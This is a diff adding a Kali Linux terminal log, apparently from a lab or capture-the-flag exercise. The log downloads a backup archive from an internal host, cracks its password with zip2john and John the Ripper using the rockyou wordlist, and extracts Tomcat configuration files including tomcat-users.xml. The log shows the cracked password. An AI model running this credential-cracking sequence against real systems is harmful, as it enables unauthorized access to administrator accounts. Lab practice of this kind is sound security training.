@@ -1,0 +1,26 @@
+┌──(kali㉿kali)-[~]
+└─$ curl http://10.0.0.21:8080/backup.zip -o backup.zip
+
+┌──(kali㉿kali)-[~]
+└─$ zip2john backup.zip > ziphash.txt
+
+┌──(kali㉿kali)-[~]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt ziphash.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+@administrator_hi5  (backup.zip)
+1g 0:00:00:01 DONE (2026-06-08 18:30) 0.8130g/s 9339Kp/s
+Session completed.
+
+┌──(kali㉿kali)-[~]
+└─$ unzip backup.zip
+[backup.zip] tomcat-users.xml password: @administrator_hi5
+  inflating: catalina.policy
+  inflating: catalina.properties
+  inflating: context.xml
+  inflating: jaspic-providers.xml
+  inflating: logging.properties
+  inflating: server.xml
+  inflating: tomcat-users.xml
+  inflating: web.xml
